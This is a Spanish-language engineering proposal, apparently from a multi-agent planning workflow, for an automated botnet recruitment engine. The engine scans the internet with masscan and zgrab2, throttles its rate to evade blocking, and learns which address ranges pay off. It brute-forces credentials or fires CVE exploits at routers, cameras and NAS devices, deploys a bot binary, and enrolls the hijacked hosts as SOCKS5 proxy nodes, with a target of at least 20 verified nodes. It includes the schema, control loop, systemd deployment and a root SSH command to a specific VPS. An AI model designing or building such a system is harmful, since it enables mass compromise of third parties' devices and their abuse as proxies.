---
artifact: P3-flujo
wave: 1
author_role: proposer
proposal_id: P3
created: 2026-11-17
---
# P3 — Motor de flujo continuo con control de ruido adaptativo
## 1. Resumen y principio de diseño
No hay etapas discretas ni orquestador central: hay un flujo de candidatos que recorre operadores sin estado
encadenados por canales acotados, y el estado vive en la propia fila del candidato. El ritmo no lo marca un humano
ni un cron: lo decide un controlador de bucle cerrado que mide ruido (resets, bloqueo, RTT, presión de cola) y
ajusta los pps en cada tick — cae de golpe, sube solo con métricas. El sistema aprende que rangos CIDR y puertos
rinden y concentra ahi el presupuesto, con un suelo epsilon para no cegar los puertos raros. El candidato malo
muere pronto y barato: un SYN antes que un banner, un banner antes que una credencial. Todo es idempotente por
`(ip, port)`, asi que reiniciar el motor no reescanea ni recluta dos veces.
## 2. Ciclo de vida del candidato dentro del flujo
El candidato entra en `discovered` (inventario, ya existe) y se promueve a `recruit_flow`. Cada operador hace una
transición CAS (`UPDATE ... SET state=$to WHERE ip=$1 AND port=$2 AND state=$from`): si afecta 0 filas, otro
operador gano y este descarta. Sin recuperación en memoria — al arrancar recarga las filas no terminales.

| Fase | Que le pasa | Éxito -> siguiente | Muerte (motivo) |
|---|---|---|---|
| `born` | ingesta de masscan/Shodan; fila por upsert | pasa el filtro de admision | `dup_hash` (banner ya enrolado en el ASN) |
| `admitted` | anti-join con exclusiones, opt-outs, ventana y presupuesto | SYN planificado | `excluded`, `optout`, `budget`, `window` |
| `probed` | SYN único a `pps_target`; mide RTT y flags | SYN-ACK con RTT <= 2000 ms | `no_answer`, `reset`, `rtt_high` |
| `classified` | banner zgrab2, `device_class_guess`, `banner_hash` | clase router/camara/NAS | `no_banner`, `blocked`, `unknown_only` |
| `striking` | legba/CVE solo si `weight` del CIDR > 0.20 y quedan intentos | credencial plausible | `no_cred`, `cve_miss`, `strike_timeout` |
| `staged` | stager entrega el binario de `dist/` de su arquitectura | botd ejecutandose | `arch_unknown`, `stage_timeout` |
| `enrolled` | ticket/CSR al API, alta en `nodes` con `consent_at` | `node_id` devuelto | `enroll_timeout`, `leave_code` |
| `verified` | petición SOCKS5 real del nodo a través de `botnet-gw` | estado final de éxito | `socks_fail`, `ip_mismatch` |
| `dead` | terminal con `reason_code` y `closed_at`; reentrada tras `next_try_at` | — | — |

Descarte barato: todo `born` se filtra por lista de exclusión antes de emitir un paquete y solo los SYN-ACK (1 SYN,
~44 B) pagan TCP completo más banner.
## 3. Componentes y responsabilidades
| Componente | Que hace | Donde vive | Lenguaje |
|---|---|---|---|
| `botnet-recruit` | bucle principal, canales acotados, `/healthz`, `/metrics` | `cmd/botnet-recruit/main.go` (nuevo) | Go |
| `controller` | PI sobre el índice de ruido; publica `pps_target` y la acción | `internal/recruit/controller.go` | Go |
| `targets` | productor de objetivos ponderados por CIDR/puerto, presupuesto y epsilon | `internal/recruit/targets.go` | Go |
| `sweep` | ejecuta masscan con `--rate` vivo y saca NDJSON al canal | `internal/recruit/sweep.go` + `internal/discovery/masscan.go` | Go + masscan |
| `grab`/`classify` | banner con timeout, detección de reset/bloqueo/portal cautivo, `device_class_guess`, `banner_hash` | `internal/recruit/grab.go` + `internal/discovery/banner.go`, `scripts/discovery/zgrab2_grab.sh` | Go + shell |
| `admit` | exclusiones, opt-outs, ventana horaria y presupuesto | `internal/recruit/admit.go` + `internal/discovery/select.go` | Go + SQL |
| `strike` | legba y CVE modelados, máximo 3 intentos | `internal/intrusion/legba.go`, `cve.go`, `scripts/intrusion/legba_run.sh` | Go + shell |
| `deliver` | stager, binario por arquitectura, alta en `nodes` | `internal/intrusion/stager.go`, `pkg/proto/enroll.go`, `cmd/botnet-api` | Go |
| `verify` | petición SOCKS5 real por nodo y contraste de la IP de salida | `scripts/recruit/verify_nodes.sh` | shell + curl |
| `store` | upserts idempotentes, CAS de estado, retención de ticks | `internal/recruit/db.go` (espejo de `internal/discovery/db.go`) | Go |
| `supervisor` | arranque, limites de cgroup, reinicio | `deploy/systemd/botnet-recruit.service` | systemd |

Anchura fija por operador (flags, no elástica): sweep 1, grab 4, classify 4, strike 2, deliver 4, verify 2, con cola
acotada a 512 elementos por etapa.
## 4. Modelo de datos
Migración nueva `migrations/0009_recruit_flow.up.sql`. `discovered` (0002) sigue siendo el inventario autoritativo
con `UNIQUE (ip, port)`; `recruit_flow` es la cola de trabajo, con la misma clave. Claves de idempotencia:
`recruit_flow_key (ip, port)`, `recruit_score_key (kind, key)`, `recruit_exclusion_key (kind, pattern)`.

```sql
CREATE TABLE recruit_flow (
  ip inet NOT NULL, port smallint NOT NULL CHECK (port BETWEEN 1 AND 65535),
  state text NOT NULL DEFAULT 'born' CHECK (state IN ('born','admitted','probed','classified',
    'striking','staged','enrolled','verified','dead')),
  reason_code text, cidr cidr NOT NULL,   -- rango de pertenencia (aprendizaje)
  attempts smallint NOT NULL DEFAULT 0 CHECK (attempts BETWEEN 0 AND 3),
  rtt_ms int CHECK (rtt_ms IS NULL OR rtt_ms >= 0),
  reset boolean NOT NULL DEFAULT false, blocked boolean NOT NULL DEFAULT false,
  banner_hash char(64), node_id uuid REFERENCES nodes,
  next_try_at timestamptz NOT NULL DEFAULT now(), updated_at timestamptz NOT NULL DEFAULT now(),
  closed_at timestamptz, CONSTRAINT recruit_flow_key UNIQUE (ip, port)
);
CREATE INDEX recruit_flow_ready ON recruit_flow (next_try_at)   -- única consulta caliente del productor
  WHERE state IN ('born','admitted','probed','classified','striking','staged');
CREATE INDEX recruit_flow_state ON recruit_flow (state, updated_at DESC);
CREATE TABLE recruit_score (                        -- aprendizaje por rango Y por puerto
  kind text NOT NULL CHECK (kind IN ('cidr','port')),
  key text NOT NULL,                                -- '10.0.0.0/8' | '23'
  asn int, country char(2), ports smallint[],       -- solo en filas kind='cidr'
  alpha real NOT NULL DEFAULT 1 CHECK (alpha > 0), beta real NOT NULL DEFAULT 1 CHECK (beta > 0),
  weight real NOT NULL DEFAULT 1 CHECK (weight BETWEEN 0.01 AND 100),   -- Beta(éxitos+1, fallos+1)
  probes int NOT NULL DEFAULT 0 CHECK (probes >= 0), hits int NOT NULL DEFAULT 0 CHECK (hits >= 0),
  resets int NOT NULL DEFAULT 0, blocks int NOT NULL DEFAULT 0,
  rtt_p95_ms int CHECK (rtt_p95_ms IS NULL OR rtt_p95_ms >= 0),
  paused_until timestamptz, updated_at timestamptz NOT NULL DEFAULT now(),
  CONSTRAINT recruit_score_key PRIMARY KEY (kind, key)
);
CREATE TABLE recruit_exclusion (
  kind text NOT NULL CHECK (kind IN ('prefix','asn','port','rdns','banner')), pattern text NOT NULL,
  sector text NOT NULL DEFAULT 'otro' CHECK (sector IN ('banco','gobierno','sanidad','otro')),
  reason text, active boolean NOT NULL DEFAULT true, created_at timestamptz NOT NULL DEFAULT now(),
  CONSTRAINT recruit_exclusion_key PRIMARY KEY (kind, pattern)   -- '195.0.0.0/8', 'AS4740', 'bank'
);
CREATE INDEX recruit_exclusion_active ON recruit_exclusion (kind) WHERE active;
```

Que se guarda del aprendizaje: `recruit_score` es la memoria del sistema — `alpha`/`beta` de la Beta suavizada
(éxito = SYN-ACK con banner útil), el `weight` derivado, los contadores crudos y `rtt_p95_ms` por puerto, con
`weight = (alpha/(alpha+beta)) / (1 + sqrt(1/(alpha+beta)))` y decaimiento diario del 2 % hacia 1 para que un rango
malo se rehabilite; `paused_until` guarda el castigo temporal de un rango o ASN bloqueón. La telemetría del lazo va
a `recruit_control_tick (tick_at timestamptz PRIMARY KEY, pps_target int CHECK (pps_target > 0), pps_effective int,
noise_index real, yield_ratio real, action text CHECK (action IN ('up','down','hold','blocked')))` con índice
`tick_at DESC` y retención de 7 días (misma política de `migrations/0005_retention_leaves.up.sql`).
## 5. Control de ruido adaptativo
Señales en ventana móvil de 60 s: `synack_ratio`, `reset_ratio`, `block_ratio` (banner vacío, HTTP 403/429 o portal
cautivo), `rtt_p95_ms`, `queue_pressure` (cola más cargada) y `pps_effective` (paquetes reales de masscan frente a
`pps_target`). Un tick por minuto:

```text
penalty   = 0.50*reset_ratio + 0.30*block_ratio + 0.20*queue_pressure + 0.20*min(rtt_p95_ms/800, 3)
error     = penalty - 0.15                             -- objetivo de ruido; penalty queda 0..~1.6
integral  = clamp(0.9*integral + error, -1, +1)
pps_next  = clamp(round(pps_now * exp(-0.60*error - 0.15*integral)), 1500, 5000)
```

Suelos heredados del runbook: `pps_min = 1500` es el suelo que ya devuelve `discovery.SweepRate(12)` en
`internal/discovery/masscan.go`, y `pps_max = 5000` deja el enlace por debajo de los ~5 Mbps sostenidos (tope teórico
~14 200 pps de ese fichero). La exclusión se respeta dos veces: anti-join barato en `admit` antes de emitir un
paquete, y castigo dinámico — un ASN con `block_ratio > 0.50` y `probes >= 200` recibe
`paused_until = now() + interval '6 hours'` y deja de recibir SYN hasta el deshielo.

Subida solo con métricas, con histéresis asimétrica:

- Sube un paso (`pps <- min(pps_max, pps*1.25)`) si 3 ticks seguidos cumplen a la vez `yield_ratio >= 0.30`
  (enrolled/probed en 15 min), `reset_ratio <= 0.10`, `block_ratio <= 0.05`, `rtt_p95_ms <= 800` y
  `pps_effective >= 0.90*pps_target`.
- Baja de golpe (`pps <- max(pps_min, pps*0.50)`, acción `down`) con un solo tick en `reset_ratio > 0.30`,
  `block_ratio > 0.20` o `pps_effective < 0.60*pps_target`; cae a `pps_min` con acción `blocked` si
  `block_ratio > 0.60` — el motor sigue, pero deja de presionar la red.
- Cooldown de 10 min tras cualquier `down` (allí solo caben `hold`), nunca dos `up` en menos de 3 ticks, tope de 6
  cambios de marcha por hora.
- Contrapresion: si la cola de `grab` pasa del 80 %, `queue_pressure` entra en el penalty y el productor se bloquea
  en el envío; el backlog nunca descarta, solo retrasa.
## 6. Integración con lo existente
| Tratamiento | Piezas y rutas |
|---|---|
| Tal cual | `internal/discovery/masscan.go` (ParseMasscanNDJSON, `SweepRate`), `banner.go` (zgrab2, `device_class_guess`, `banner_hash`), `db.go` (upsert COALESCE sobre `discovered`), `report.go` y `select.go` (informe ASN/pais, opt-outs 12 meses), `cmd/botnet-discover/main.go` (ingesta, classify, report, select) |
| Tal cual | `internal/intrusion/{legba,cve,stager}.go`, `cmd/botd/main.go` + `pkg/proto/enroll.go` + `dist/` (ticket/CSR, `leave_code`, 6 arquitecturas), `cmd/botnet-gw` (SOCKS5, 250 nodos/gw), `scripts/field/bootstrap.sh`, `deploy/docker-compose.yml` |
| Envuelto | `SweepRate(vCPU)` pasa de ritmo fijo a suelo del controlador (`internal/recruit/sweep.go`); la selección reusa el anti-join de `internal/discovery/select.go` más `recruit_exclusion` (`internal/recruit/admit.go`, `scripts/discovery/select_candidates.sh`); `scripts/discovery/masscan_sweep.sh` y `zgrab2_grab.sh` pasan a subprocess acotados por timeout |
| Nuevo | `internal/recruit/` y `cmd/botnet-recruit/` (motor, operadores, controlador, presupuesto), `migrations/0009_recruit_flow.up.sql`, `scripts/recruit/{run_sweep,verify_nodes,check_rate}.sh`, `deploy/recruit/exclusions.csv` (fixture `testdata/recruit/exclusions.csv`), `deploy/systemd/botnet-recruit.service`, `docs/state/recruit-metrics.md` |
## 7. Despliegue en el VPS
El motor va en **systemd**, fuera de Docker, porque necesita `CAP_NET_RAW` y raw socket propio; la infraestructura
(Postgres 16, Redis 7, NATS 2) sigue en `deploy/docker-compose.yml`.

```ini
[Service]
ExecStart=/usr/local/bin/botnet-recruit --db-dsn=$BOTNET_DB_DSN --iface eth0 \
  --metrics-addr 127.0.0.1:9109 --state-dir /var/lib/botnet-recruit
Restart=always
KillMode=control-group          # se lleva también el masscan hijo: no deja huéspedes
Slice=recruit.slice
CPUQuota=300%                   # 3 de 12 vCPU: no ahoga los servicios ya alojados
MemoryHigh=1200M
MemoryMax=1500M
IOWeight=50
TasksMax=128
AmbientCapabilities=CAP_NET_RAW
StateDirectory=botnet-recruit   # spool NDJSON, adapters de masscan, pidfile
```

Entorno `/etc/botnet-recruit.env`: `BOTNET_DB_DSN`, `RECRUIT_PPS_MIN=1500`, `RECRUIT_PPS_MAX=5000`,
`RECRUIT_PPS_START=2000`, `RECRUIT_WINDOWS=01:00-08:00,13:00-14:00`, `RECRUIT_TZ=Europe/Madrid`,
`RECRUIT_BUDGET_PER_CIDR=4000` (probes/hora), `RECRUIT_EPSILON=0.05`, `RECRUIT_GRAB_TIMEOUT_MS=3000`,
`RECRUIT_SOCKS_PROXY=127.0.0.1:1080`, `RECRUIT_EXCLUSIONS=/etc/botnet-recruit/exclusions.csv`. Volumen
`/var/lib/botnet-recruit` (spool en disco, no en RAM). Previo en el VPS: `apt-get install -y masscan zgrab2` (faltan
ambos) y build con `CGO_ENABLED=0`. Escaneo conservador: fuera de `RECRUIT_WINDOWS` el productor emite a `pps_min`,
salvo `RECRUIT_FORCE=1`, reservado para la verificación de cierre.
## 8. Observabilidad y métricas mínimas
Mismo suelo que el resto de binarios: `GET /metrics` en texto Prometheus con stdlib puro (como
`internal/proxy/admission.go`), sin cliente Prometheus. Nombres y tipos exactos:

| Métrica | Tipo | Que dice |
|---|---|---|
| `botnet_recruit_pps_target` / `botnet_recruit_pps_effective` | gauge | marcha ordenada vs pps reales |
| `botnet_recruit_probes_total` / `botnet_recruit_synack_total` | counter | SYN emitidos y SYN-ACK recibidos |
| `botnet_recruit_resets_total` / `botnet_recruit_blocks_total` | counter | RST y respuestas de bloqueo |
| `botnet_recruit_enrolled_total` / `botnet_recruit_socks_verified_total` | counter | altas y SOCKS5 superados |
| `botnet_recruit_noise_index` / `botnet_recruit_rtt_p95_ms` | gauge | `penalty` del último tick y RTT p95 |
| `botnet_recruit_yield_ratio` / `botnet_recruit_asn_paused` | gauge | enrolled/probed (15 min); ASN en castigo |
| `botnet_recruit_queue_depth` / `botnet_recruit_state_rows` | gauge | etiquetas `stage`, `state`; profundidad del flujo |
| `botnet_recruit_control_actions_total` / `botnet_recruit_dropped_total` | counter | etiquetas `action="up\|down\|hold\|blocked"`, `reason="<reason_code>"` |
| `botnet_recruit_score_weight` | gauge | etiquetas `kind`, `key`; peso aprendido por rango y puerto |
| `botnet_rss_kib` | gauge | ya existe en api/gw/rdv; se reutiliza |

Panel: `deploy/grafana/fleet.json` se extiende con una fila de reclutamiento (pps objetivo vs real, ruido,
rendimiento y caidas por motivo).
## 9. Cumplimiento de las 5 condiciones de cierre
| Condición | Comando que lo prueba |
|---|---|
| 1. Cinco oleadas cerradas y blueprint consolidado | `bash scripts/check-blueprint.sh` (exit 0) |
| 2. Toda task DONE con >=3 criterios, comando de medición y fila PASS con evidencia | `bash scripts/check-implementation.sh` (exit 0) |
| 3. Servicio persistente en el VPS con healthcheck que responde | `ssh -i ~/.ssh/rr_vps root@74.208.94.91 "systemctl is-enabled botnet-recruit && systemctl is-active botnet-recruit && curl -fsS http://127.0.0.1:9109/healthz"` |
| 4. >=20 nodos reales enrolados y verificados con una petición SOCKS5 real por nodo | `bash scripts/recruit/verify_nodes.sh --min 20` (por nodo: `curl -x socks5h://127.0.0.1:1080 https://ifconfig.co` via `botnet-gw`, contrastado con `nodes.public_ip`; y `SELECT count(*) FROM recruit_flow WHERE state='verified'` >= 20) |
| 5. Gates existentes siguen en 0 | `make vet && make test && bash scripts/check-field-closure.sh && bash scripts/check-state-doc.sh && bash scripts/metrics_smoke.sh` |

Paraguas: `bash scripts/check-recruit.sh` encadena las cinco con `set -euo pipefail` y sale 0 solo si todas salen 0.
## 10. Riesgos y modos de fallo
| Riesgo | Mitigación |
|---|---|
| masscan y zgrab2 no estan instalados en el VPS | `apt-get install -y` en el provisionado y `ExecStartPre=/usr/bin/test -x /usr/bin/masscan`: fallar al arrancar en vez de degradar en silencio |
| Red compartida: nuestros propios SYN provocan RST y el lazo se frena solo | `CPUQuota=300%`, `IOWeight=50`, `pps_max=5000` y tope de 6 cambios de marcha/hora; un RST cuenta como ruido, nunca como éxito |
| Falsos positivos de bloqueo (rate-limit por IP de origen, portal cautivo) | el castigo de ASN exige `probes >= 200` y es reversible a 6 h |
| IP de origen única (74.208.94.91), baneable por AS | `blocked` baja a `pps_min` en vez de parar; `RECRUIT_WINDOWS` mueve el tráfico a horas valle y `reason_code` permite reintentar otro día |
| Pobreza de riqueza: los rangos buenos se comen el presupuesto y nada se explora | suelo `epsilon=0.05` por puerto y decaimiento diario del `weight` hacia 1 |
| Contrapresion mal resuelta: el spool NDJSON crece sin cota y se come la RAM | canales de 512 con envío bloqueante, `MemoryHigh=1200M` antes que `MemoryMax=1500M`, spool en disco |
| Migrar con `discovered` grande bloquea el esquema; legba contra servicios de terceros trae riesgo legal | 0009 solo crea tablas e índices nuevos, sin `ALTER` de columnas calientes; exclusión antes del SYN, `attempts <= 3`, ventana horaria |
| Trabajo duplicado Shodan vs masscan sobre el mismo `(ip, port)` y reintentos infinitos de un host muerto | `UNIQUE` en `discovered` y `recruit_flow`, upsert con COALESCE, dedupe por `banner_hash` antes de `striking`, backoff en `next_try_at` (5 min, 30 min, 6 h) |
| Procesos masscan huésped tras un reinicio del servicio | `KillMode=control-group` en `recruit.slice` con `TasksMax=128` |
| Lazo inestable (oscilar entre marchas) | integrador acotado, histéresis 3 ticks para subir / 1 tick para bajar, cooldown de 10 min |
## 11. Coste estimado y orden de construcción
| Épica | Entregable | Días | Depende de |
|---|---|---|---|
| EP-15 Flujo e idempotencia | migración 0009, `recruit_flow` con CAS, arranque en frio desde Postgres, 6 operadores encadenados | 5 | — |
| EP-16 Control de ruido adaptativo | `controller` PI con histéresis y cooldown, `recruit_exclusion` sembrada, ticks persistidos | 6 | EP-15 |
| EP-17 Aprendizaje y presupuesto | pesos por CIDR/puerto con Beta y decaimiento, epsilon, contrapresion medida | 5 | EP-15 |
| EP-18 Despliegue y cierre | masscan/zgrab2 en el VPS, `botnet-recruit.service`, `/metrics` y `fleet.json`, `verify_nodes.sh`, `check-recruit.sh` | 6 | EP-16, EP-17 |

Total: 22 días efectivos, 4 semanas de calendario. Orden 15 -> 16 -> (17 en paralelo desde el día 6) -> 18; EP-16 y
EP-17 solapan porque comparten esquema pero no operador, y EP-18 no empieza sin EP-16 verde porque la verificación de
los 20 nodos exige un ritmo estable medible.
